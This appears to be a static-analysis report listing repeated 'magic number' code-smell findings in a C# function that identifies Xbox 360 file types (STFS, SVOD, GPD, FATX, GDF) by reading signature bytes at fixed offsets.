Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: switch (sig) {  case (uint)AllMagic.CON:  case (uint)AllMagic.LIVE:  case (uint)AllMagic.PIRS:  	{  		if (xIO.Length < 0x37C)  			break;  		xIO.Position = 0x379;  		byte[] desc = xIO.ReadBytes (3);  		if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  			xReturn = XboxFileType.STFS;  		else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  			xReturn = XboxFileType.SVOD;  	}  	break;  case (uint)AllMagic.Music:  	{  		xReturn = XboxFileType.Music;  	}  	break;  case (uint)AllMagic.XDBF:  	{  		xReturn = XboxFileType.GPD;  	}  	break;  case 0:  	{  		if (xIO.Length < 0x130EB0004)  			break;  		xIO.Position = 0x130EB0000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  			break;  		xReturn = XboxFileType.FATX;  	}  	break;  case (uint)AllMagic.XSF:  	{  		xReturn = XboxFileType.GDF;  	}  	break;  default:  	break;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: switch (sig) {  case (uint)AllMagic.CON:  case (uint)AllMagic.LIVE:  case (uint)AllMagic.PIRS:  	{  		if (xIO.Length < 0x37C)  			break;  		xIO.Position = 0x379;  		byte[] desc = xIO.ReadBytes (3);  		if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  			xReturn = XboxFileType.STFS;  		else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  			xReturn = XboxFileType.SVOD;  	}  	break;  case (uint)AllMagic.Music:  	{  		xReturn = XboxFileType.Music;  	}  	break;  case (uint)AllMagic.XDBF:  	{  		xReturn = XboxFileType.GPD;  	}  	break;  case 0:  	{  		if (xIO.Length < 0x130EB0004)  			break;  		xIO.Position = 0x130EB0000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  			break;  		xReturn = XboxFileType.FATX;  	}  	break;  case (uint)AllMagic.XSF:  	{  		xReturn = XboxFileType.GDF;  	}  	break;  default:  	break;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: switch (sig) {  case (uint)AllMagic.CON:  case (uint)AllMagic.LIVE:  case (uint)AllMagic.PIRS:  	{  		if (xIO.Length < 0x37C)  			break;  		xIO.Position = 0x379;  		byte[] desc = xIO.ReadBytes (3);  		if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  			xReturn = XboxFileType.STFS;  		else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  			xReturn = XboxFileType.SVOD;  	}  	break;  case (uint)AllMagic.Music:  	{  		xReturn = XboxFileType.Music;  	}  	break;  case (uint)AllMagic.XDBF:  	{  		xReturn = XboxFileType.GPD;  	}  	break;  case 0:  	{  		if (xIO.Length < 0x130EB0004)  			break;  		xIO.Position = 0x130EB0000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  			break;  		xReturn = XboxFileType.FATX;  	}  	break;  case (uint)AllMagic.XSF:  	{  		xReturn = XboxFileType.GDF;  	}  	break;  default:  	break;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: switch (sig) {  case (uint)AllMagic.CON:  case (uint)AllMagic.LIVE:  case (uint)AllMagic.PIRS:  	{  		if (xIO.Length < 0x37C)  			break;  		xIO.Position = 0x379;  		byte[] desc = xIO.ReadBytes (3);  		if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  			xReturn = XboxFileType.STFS;  		else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  			xReturn = XboxFileType.SVOD;  	}  	break;  case (uint)AllMagic.Music:  	{  		xReturn = XboxFileType.Music;  	}  	break;  case (uint)AllMagic.XDBF:  	{  		xReturn = XboxFileType.GPD;  	}  	break;  case 0:  	{  		if (xIO.Length < 0x130EB0004)  			break;  		xIO.Position = 0x130EB0000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  			break;  		xReturn = XboxFileType.FATX;  	}  	break;  case (uint)AllMagic.XSF:  	{  		xReturn = XboxFileType.GDF;  	}  	break;  default:  	break;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: switch (sig) {  case (uint)AllMagic.CON:  case (uint)AllMagic.LIVE:  case (uint)AllMagic.PIRS:  	{  		if (xIO.Length < 0x37C)  			break;  		xIO.Position = 0x379;  		byte[] desc = xIO.ReadBytes (3);  		if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  			xReturn = XboxFileType.STFS;  		else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  			xReturn = XboxFileType.SVOD;  	}  	break;  case (uint)AllMagic.Music:  	{  		xReturn = XboxFileType.Music;  	}  	break;  case (uint)AllMagic.XDBF:  	{  		xReturn = XboxFileType.GPD;  	}  	break;  case 0:  	{  		if (xIO.Length < 0x130EB0004)  			break;  		xIO.Position = 0x130EB0000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  			break;  		xReturn = XboxFileType.FATX;  	}  	break;  case (uint)AllMagic.XSF:  	{  		xReturn = XboxFileType.GDF;  	}  	break;  default:  	break;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: switch (sig) {  case (uint)AllMagic.CON:  case (uint)AllMagic.LIVE:  case (uint)AllMagic.PIRS:  	{  		if (xIO.Length < 0x37C)  			break;  		xIO.Position = 0x379;  		byte[] desc = xIO.ReadBytes (3);  		if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  			xReturn = XboxFileType.STFS;  		else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  			xReturn = XboxFileType.SVOD;  	}  	break;  case (uint)AllMagic.Music:  	{  		xReturn = XboxFileType.Music;  	}  	break;  case (uint)AllMagic.XDBF:  	{  		xReturn = XboxFileType.GPD;  	}  	break;  case 0:  	{  		if (xIO.Length < 0x130EB0004)  			break;  		xIO.Position = 0x130EB0000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  			break;  		xReturn = XboxFileType.FATX;  	}  	break;  case (uint)AllMagic.XSF:  	{  		xReturn = XboxFileType.GDF;  	}  	break;  default:  	break;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: switch (sig) {  case (uint)AllMagic.CON:  case (uint)AllMagic.LIVE:  case (uint)AllMagic.PIRS:  	{  		if (xIO.Length < 0x37C)  			break;  		xIO.Position = 0x379;  		byte[] desc = xIO.ReadBytes (3);  		if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  			xReturn = XboxFileType.STFS;  		else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  			xReturn = XboxFileType.SVOD;  	}  	break;  case (uint)AllMagic.Music:  	{  		xReturn = XboxFileType.Music;  	}  	break;  case (uint)AllMagic.XDBF:  	{  		xReturn = XboxFileType.GPD;  	}  	break;  case 0:  	{  		if (xIO.Length < 0x130EB0004)  			break;  		xIO.Position = 0x130EB0000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  			break;  		xReturn = XboxFileType.FATX;  	}  	break;  case (uint)AllMagic.XSF:  	{  		xReturn = XboxFileType.GDF;  	}  	break;  default:  	break;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: switch (sig) {  case (uint)AllMagic.CON:  case (uint)AllMagic.LIVE:  case (uint)AllMagic.PIRS:  	{  		if (xIO.Length < 0x37C)  			break;  		xIO.Position = 0x379;  		byte[] desc = xIO.ReadBytes (3);  		if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  			xReturn = XboxFileType.STFS;  		else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  			xReturn = XboxFileType.SVOD;  	}  	break;  case (uint)AllMagic.Music:  	{  		xReturn = XboxFileType.Music;  	}  	break;  case (uint)AllMagic.XDBF:  	{  		xReturn = XboxFileType.GPD;  	}  	break;  case 0:  	{  		if (xIO.Length < 0x130EB0004)  			break;  		xIO.Position = 0x130EB0000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  			break;  		xReturn = XboxFileType.FATX;  	}  	break;  case (uint)AllMagic.XSF:  	{  		xReturn = XboxFileType.GDF;  	}  	break;  default:  	break;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  	xReturn = XboxFileType.STFS;  else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  	xReturn = XboxFileType.STFS;  else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  	xReturn = XboxFileType.STFS;  else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  	xReturn = XboxFileType.STFS;  else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  	xReturn = XboxFileType.STFS;  else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  	xReturn = XboxFileType.STFS;  else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  	xReturn = XboxFileType.STFS;  else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  	xReturn = XboxFileType.SVOD;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xReturn == XboxFileType.None) {  	try {  		xIO.Position = 0;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x1FB20;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x30600;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x7FF000;  					if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  						xIO.Position = 0xFDA0000;  						if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  							xIO.Position = 0x130EB0000;  							if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  								xReturn = XboxFileType.FATX;  						}  						else  							xReturn = XboxFileType.GDF;  					}  					else  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	catch {  	}  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xReturn == XboxFileType.None) {  	try {  		xIO.Position = 0;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x1FB20;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x30600;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x7FF000;  					if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  						xIO.Position = 0xFDA0000;  						if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  							xIO.Position = 0x130EB0000;  							if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  								xReturn = XboxFileType.FATX;  						}  						else  							xReturn = XboxFileType.GDF;  					}  					else  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	catch {  	}  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xReturn == XboxFileType.None) {  	try {  		xIO.Position = 0;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x1FB20;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x30600;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x7FF000;  					if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  						xIO.Position = 0xFDA0000;  						if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  							xIO.Position = 0x130EB0000;  							if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  								xReturn = XboxFileType.FATX;  						}  						else  							xReturn = XboxFileType.GDF;  					}  					else  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	catch {  	}  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xReturn == XboxFileType.None) {  	try {  		xIO.Position = 0;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x1FB20;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x30600;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x7FF000;  					if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  						xIO.Position = 0xFDA0000;  						if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  							xIO.Position = 0x130EB0000;  							if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  								xReturn = XboxFileType.FATX;  						}  						else  							xReturn = XboxFileType.GDF;  					}  					else  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	catch {  	}  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	xIO.Position = 0;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x1FB20;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x30600;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x7FF000;  				if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  					xIO.Position = 0xFDA0000;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x130EB0000;  						if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  catch {  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	xIO.Position = 0;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x1FB20;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x30600;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x7FF000;  				if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  					xIO.Position = 0xFDA0000;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x130EB0000;  						if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  catch {  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	xIO.Position = 0;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x1FB20;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x30600;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x7FF000;  				if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  					xIO.Position = 0xFDA0000;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x130EB0000;  						if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  catch {  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	xIO.Position = 0;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x1FB20;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x30600;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x7FF000;  				if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  					xIO.Position = 0xFDA0000;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x130EB0000;  						if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  catch {  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x1FB20;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x30600;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x7FF000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  				xIO.Position = 0xFDA0000;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x130EB0000;  					if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.FATX;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x1FB20;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x30600;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x7FF000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  				xIO.Position = 0xFDA0000;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x130EB0000;  					if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.FATX;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x1FB20;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x30600;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x7FF000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  				xIO.Position = 0xFDA0000;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x130EB0000;  					if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.FATX;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x1FB20;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x30600;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x7FF000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  				xIO.Position = 0xFDA0000;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x130EB0000;  					if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  						xReturn = XboxFileType.FATX;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.FATX;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x30600;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x7FF000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  			xIO.Position = 0xFDA0000;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x130EB0000;  				if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.FATX;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
